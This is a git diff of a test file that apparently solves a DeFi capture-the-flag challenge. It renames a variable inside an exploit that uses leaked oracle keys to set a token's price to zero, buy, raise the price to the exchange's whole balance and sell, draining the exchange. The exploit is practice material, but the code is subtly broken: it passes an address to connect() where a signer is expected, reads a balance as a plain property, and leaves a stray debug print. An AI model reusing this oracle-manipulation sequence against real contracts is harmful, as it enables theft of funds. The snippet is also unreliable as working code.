@@ -71,12 +71,12 @@ describe('Compromised challenge', function () {
         console.log("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WOWOWOWOWOWO");
 		
         for (let i = 0; i < passwords.length; i++) {
-			await this.oracle.connect(passwords[i]).postPrice(symbolId, 0);
+			await this.oracle.connect(passwords[i]).postPrice(tokenId, 0);
         }
 		await this.exchange.connect(attacker.address).buyOne();
 		let exchangeBalance = this.exchange.balance;
 		for (let i = 0; i < passwords.length; i++) {
-			await this.oracle.connect(passwords[i]).postPrice(symbolId, exchangeBalance);
+			await this.oracle.connect(passwords[i]).postPrice(tokenId, exchangeBalance);
         }
 		
 		await this.exchange.connect(attacker.address).sellOne();
